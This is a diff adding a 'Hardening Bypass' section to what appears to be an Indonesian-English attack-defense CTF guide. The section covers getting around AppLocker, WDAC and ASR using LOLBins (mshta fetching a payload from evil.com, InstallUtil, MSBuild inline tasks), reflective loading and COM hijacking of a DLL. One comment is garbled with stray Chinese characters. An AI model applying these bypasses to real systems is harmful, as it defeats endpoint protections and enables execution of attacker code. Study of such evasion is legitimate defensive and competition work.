@@ -653,3 +653,52 @@ while true; do python3 /opt/checker.py localhost && echo "CHECKER OK $(date)" ||
 ---
 
 *Attack-Defense Hardening · 5 Menit Pertama = Penentu · Hardening > Attack · Checker = Tulang Punggung Defense Score · Backup Sebelum Patch · Rollback <15 Detik*
+
+## Konkret — Hardening Bypass (Testable)
+
+### AppLocker / WDAC Bypass
+
+```powershell
+# 1. LOLBins (Living Off the Land Binaries)
+#    Binary Microsoft-signed → not blocked by default
+#    Examples: mshta.exe, wscript.exe, cscript.exe, msbuild.exe
+
+# mshta (execute HTA → script)
+mshta.exe http://evil.com/payload.hta
+# Payload.hta:
+# <script>new ActiveXObject("WScript.Shell").Run("powershell -c ...")</script>
+
+# 2. InstallUtil.exe (bypass path allow)
+InstallUtil.exe /logfile= /LogToConsole=false /U evil.dll
+# evil.dll: System.Configuration.Install.Installer subclass → uninstall → code exec
+
+# 3. MSBuild inline task
+msbuild.exe p.xml
+# p.xml: <Task>...<![CDATA[ code ]]></Task>
+```
+
+### ASR (Attack Surface Reduction) Bypass
+
+```powershell
+# ASR rule block: Office child process, WMI event sub, credential steal
+# 1. Test: which rule triggered via Event ID 1121 (Audit)
+# 2. Bypass: use alternative binary yang tidak di-cover
+#    - Office macro → use出版的Excel instead of Word (different rule?)
+#    - WScript → use mshta (not in rule)
+#    - PowerShell → use C# inline compile (Add-Type)
+```
+
+### WDAC (Windows Defender Application Control) Bypass
+
+```powershell
+# 1. WDAC = code integrity policy (block unsigned)
+# 2. Bypass: LOLBin (signed by Microsoft)
+# 3. Bypass: reflective load (memory only) → no file → no check
+# 4. Bypass: COM hijack → load arbitrary DLL via legit process
+#    COM object: HKCU\Software\Classes\CLSID\{...}\InProcServer32
+#    → C:\evil.dll (loaded by explorer.exe → signed process)
+```
+---
+
+audited
+---
